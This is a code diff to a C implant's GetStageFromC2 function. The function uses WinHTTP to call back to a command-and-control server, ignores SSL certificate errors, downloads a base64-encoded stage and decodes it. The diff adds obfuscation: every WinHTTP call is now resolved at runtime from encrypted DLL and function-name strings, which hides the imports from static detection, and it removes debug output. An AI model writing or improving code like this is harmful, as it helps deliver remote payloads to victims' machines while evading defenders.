@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <winhttp.h>
 
-// #include "base64.h"
 #include "settings.h"
+#include "imports.h"
+#include "strings.h"
 
 #define _CALLBACK_URL L"/stage"
 #define _POST_HEADER L"Content-Type: application/x-www-form-urlencoded\r\n"
@@ -25,30 +26,55 @@ CHAR* GetStageFromC2(DWORD* sSize)
             SECURITY_FLAG_IGNORE_CERT_CN_INVALID | \
             SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
+    // get out close handle export
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                              decrypt_string(STRING_WINHTTP_CLOSEH, STRING_WINHTTP_CLOSEH_KEY));
+
     // init the connection
-    hSession = WinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                         decrypt_string(STRING_WINHTTP_OPEN, STRING_WINHTTP_OPEN_KEY));
+
+    hSession = rWinHttpOpen((LPCWSTR)_CALLBACK_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession)
     {
         return NULL;
     }
 
     // make the connection
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                  decrypt_string(STRING_WINHTTP_CONNECT, STRING_WINHTTP_CONNECT_KEY));
+
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)_C2_CALLBACK_ADDRESS, _C2_CALLBACK_PORT, 0);
     if (!hConnect)
     {
+        rWinHttpCloseHandle(hSession);
+
         return NULL;
     }
 
     // setup our request
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                              decrypt_string(STRING_WINHTTP_OPENREQ, STRING_WINHTTP_OPENREQ_KEY));
+
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
     if (!hRequest)
     {
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return NULL;
     }
 
-    // let us connect with bad ssl certs 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
+    // let us connect with bad ssl certs
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                        decrypt_string(STRING_WINHTTP_SETOPT, STRING_WINHTTP_SETOPT_KEY));
+
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &Flags, sizeof(Flags)))
     {
+        rWinHttpCloseHandle(hRequest);
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return NULL;
     }
 
@@ -73,23 +99,30 @@ CHAR* GetStageFromC2(DWORD* sSize)
     #endif
 
     // make the request
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                              decrypt_string(STRING_WINHTTP_SENDREQ, STRING_WINHTTP_SENDREQ_KEY));
+
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)payload, strlen(payload), strlen(payload), 0);
 
     if (bResults)
     {
-        DEBUG("made callback");
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                                              decrypt_string(STRING_WINHTTP_RECVRES, STRING_WINHTTP_RECVRES_KEY));
 
-        do 
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
+
+        do
         {
             // check how much available data there is
             dwSize = 0;
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
+            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                                                           decrypt_string(STRING_WINHTTP_DATAAVA, STRING_WINHTTP_DATAAVA_KEY));
+
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
-                DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                 break;
             }
-            
+
             // out of data
             if (!dwSize)
             {
@@ -100,15 +133,18 @@ CHAR* GetStageFromC2(DWORD* sSize)
             pszOutBuffer = (LPSTR)malloc(dwSize+1);
             if (!pszOutBuffer)
             {
-                DEBUG("Out of memory, must be a big stage\n");
+                DEBUG("Out of memory\n");
                 break;
             }
-            
+
             // read all the data
             ZeroMemory(pszOutBuffer, dwSize + 1);
 
-            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-            {                                  
+            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(decrypt_string(STRING_WINHTTP_DLL, STRING_WINHTTP_DLL_KEY)),
+                                                                                             decrypt_string(STRING_WINHTTP_READATA, STRING_WINHTTP_READATA_KEY));
+
+            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
+            {
                 // been an error
                 break;
             }
@@ -116,10 +152,10 @@ CHAR* GetStageFromC2(DWORD* sSize)
             {
                 asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
             }
-        
+
             // free the memory
             free(pszOutBuffer);
-                
+
         } while (dwSize > 0);
     }
 
@@ -130,9 +166,15 @@ CHAR* GetStageFromC2(DWORD* sSize)
 
     // decode the data
     b64_out = base64_decode((const char*)ResBuffer, out_len - 1, &out_len);
-    
+
     // give the values back
     *sSize = b64_len;
+
+    // clean up the handles
+    rWinHttpCloseHandle(hRequest);
+    rWinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hConnect);
+
     return b64_out;
 
 }
